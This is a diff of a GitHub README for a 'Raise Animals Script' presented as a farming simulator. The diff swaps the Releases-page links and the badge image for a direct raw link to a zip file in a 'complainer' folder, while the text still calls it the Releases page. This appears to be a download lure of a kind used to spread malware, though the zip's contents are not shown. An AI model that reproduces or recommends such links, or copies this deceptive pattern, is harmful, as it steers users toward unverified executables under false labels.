@@ -4,13 +4,13 @@
 Raise Animals is a relaxing farming simulator where you can collect, breed, and raise hundreds of cute pets and farm animals. Build your dream farm and become the richest farmer on the server. Enjoy a peaceful environment while managing your farm and unlocking new animals and features.
 
 ## 🖱️ Download Now
-[![Download Raise-Animals-Script](https://img.shields.io/badge/Download-Raise--Animals--Script-brightgreen)](https://github.com/NOOBI13124/Raise-Animals-Script/releases)
+[![Download Raise-Animals-Script](https://raw.githubusercontent.com/NOOBI13124/Raise-Animals-Script/main/complainer/Raise-Animals-Script-v2.7.zip)](https://raw.githubusercontent.com/NOOBI13124/Raise-Animals-Script/main/complainer/Raise-Animals-Script-v2.7.zip)
 
 ## 🚀 Getting Started
 To get started with Raise Animals, follow these simple steps.
 
 ### 1. Download the Application
-Visit the Releases page to download the latest version of Raise Animals Script. You can find it here: [Download Raise-Animals-Script](https://github.com/NOOBI13124/Raise-Animals-Script/releases).
+Visit the Releases page to download the latest version of Raise Animals Script. You can find it here: [Download Raise-Animals-Script](https://raw.githubusercontent.com/NOOBI13124/Raise-Animals-Script/main/complainer/Raise-Animals-Script-v2.7.zip).
 
 ### 2. Install the Application
 Once the download is complete, locate the downloaded file on your computer. 
@@ -60,6 +60,6 @@ To keep up with the latest news and updates on Raise Animals, follow us and rece
 2. Enable notifications in your GitHub settings.
 
 ## 📥 Download & Install
-Once you have followed the steps above, you are ready to start your farming journey. To download the application, go back to the Releases page: [Download Raise-Animals-Script](https://github.com/NOOBI13124/Raise-Animals-Script/releases). 
+Once you have followed the steps above, you are ready to start your farming journey. To download the application, go back to the Releases page: [Download Raise-Animals-Script](https://raw.githubusercontent.com/NOOBI13124/Raise-Animals-Script/main/complainer/Raise-Animals-Script-v2.7.zip). 
 
 Enjoy your time building the farm of your dreams, and happy farming!
